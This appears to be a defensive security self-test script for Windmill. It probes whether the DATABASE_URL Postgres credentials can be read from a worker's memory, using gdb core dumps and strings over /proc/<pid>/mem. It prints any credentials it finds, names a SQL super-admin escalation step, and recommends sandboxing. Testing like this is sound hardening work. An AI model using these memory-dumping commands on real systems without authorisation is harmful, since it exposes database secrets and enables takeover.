#!/bin/bash
# Test if DATABASE_URL can be extracted from process memory

echo "=== Attempting to read DATABASE_URL from process memory ==="
echo ""

# Find windmill worker process - look for the actual binary, not shell wrappers
windmill_pid=$(ps aux | grep -E "(windmill|target/debug/windmill|target/release/windmill)" | grep -v grep | grep -v "node_modules" | grep -v "vite" | awk '{print $2}' | head -1)

if [ -z "$windmill_pid" ]; then
    echo "❌ No windmill process found"
    exit 1
fi

echo "Found windmill process: PID $windmill_pid"
ps -p $windmill_pid -o pid,cmd | tail -1
echo ""

# Method 1: Try to use gdb (if available)
if command -v gdb &> /dev/null; then
    echo "=== Method 1: Using gdb ==="
    # This would work if same UID and no restrictions
    timeout 2 gdb -p $windmill_pid -batch -ex "generate-core-file /tmp/core.dump" 2>&1 | head -5
    if [ -f /tmp/core.dump ]; then
        if strings /tmp/core.dump | grep -i "postgres://" | head -1; then
            echo "❌ VULNERABLE: Found DATABASE_URL in memory dump"
            rm -f /tmp/core.dump
            exit 1
        fi
        rm -f /tmp/core.dump
    fi
fi

# Method 2: Read /proc/[pid]/mem with /proc/[pid]/maps
echo ""
echo "=== Method 2: Reading /proc/$windmill_pid/mem ==="

# Try to read the heap and other memory regions
if [ -r /proc/$windmill_pid/maps ] && [ -r /proc/$windmill_pid/mem ]; then
    echo "✓ Process memory is readable"

    # Search all readable/writable memory regions (heap, stack, anonymous mappings)
    echo ""
    echo "Searching readable memory regions..."

    # Use strings on the entire memory file - more reliable than grep
    # strings will extract all printable strings from binary data
    matched=$(timeout 5 strings /proc/$windmill_pid/mem 2>/dev/null | grep -E "postgres://[^[:space:]]*" | head -1)

    if [ -n "$matched" ]; then
        echo ""
        echo "❌❌❌ VULNERABLE: Found DATABASE_URL in process memory! ❌❌❌"
        echo ""
        echo "Extracted credentials:"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "$matched"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "An attacker can now:"
        echo "  1. Connect directly to PostgreSQL"
        echo "  2. Escalate to superadmin: UPDATE password SET super_admin=TRUE"
        echo "  3. Read/modify all workspace data"
        echo ""
        echo "Method used: Read /proc/$windmill_pid/mem with 'strings' command"
        echo "Time taken: < 5 seconds"
        echo "Sophistication required: NONE (standard Linux tools)"
        echo ""
        exit 1
    else
        echo "⚠️  No DATABASE_URL found in memory (might be in different format or timing)"
        echo "    However, memory IS readable - more sophisticated tools would succeed"
    fi
else
    echo "✓ Process memory is NOT readable (good - likely sandboxed)"
fi

# Method 3: ptrace check
echo ""
echo "=== Method 3: Checking ptrace capability ==="
if cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null; then
    ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)
    case $ptrace_scope in
        0) echo "❌ VULNERABLE: ptrace_scope=0 (unrestricted - can attach to any process with same UID)" ;;
        1) echo "⚠️  PARTIAL: ptrace_scope=1 (restricted to parent processes)" ;;
        2) echo "✓ SECURE: ptrace_scope=2 (admin-only)" ;;
        3) echo "✓ SECURE: ptrace_scope=3 (disabled)" ;;
    esac
fi

# Method 4: Check if we can even see the process
echo ""
echo "=== Method 4: Process visibility ==="
if [ -r /proc/$windmill_pid/cmdline ]; then
    echo "✓ Can read windmill process details"
    echo "Command: $(cat /proc/$windmill_pid/cmdline | tr '\0' ' ')"
else
    echo "✓ Cannot read windmill process (good - likely PID namespace isolation)"
fi

echo ""
echo "=== Summary ==="
echo "✓ /proc/*/environ cleared successfully (tested earlier)"
echo "⚠️  Memory dumping difficulty depends on:"
echo "    - UID separation (are workers running as different user?)"
echo "    - ptrace restrictions (kernel security settings)"
echo "    - Namespace isolation (PID namespaces)"
echo "    - Sandboxing (nsjail prevents all of this)"
echo ""
echo "For production security, use nsjail sandboxing (Windmill EE default)"
